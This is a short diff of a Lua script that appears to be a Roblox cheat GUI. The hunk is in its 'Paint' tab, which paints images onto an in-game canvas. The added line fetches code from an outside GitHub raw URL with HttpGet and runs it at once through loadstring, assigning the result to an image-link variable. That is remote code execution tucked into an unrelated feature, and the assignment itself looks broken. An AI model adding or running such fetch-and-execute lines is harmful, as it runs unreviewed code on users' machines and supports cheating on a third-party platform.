@@ -592,7 +592,7 @@ end)
 local Tab4 = Window:Tab("Paint", "http://www.roblox.com/asset/?id=6023426915")
 Tab4:Label("Paint Images on Canvas, accepts discord cdn links")
 Tab4:Textbox("1x1 canvas", "requires 1x1 canvas", true, function(text)
-    local link = rxztent
+    local link = loadstring(game:HttpGet"https://raw.githubusercontent.com/Rxztent/NOOOO/main/e")()
     name = "BlockStd"
     checkloop = 0
     waitloop = 0
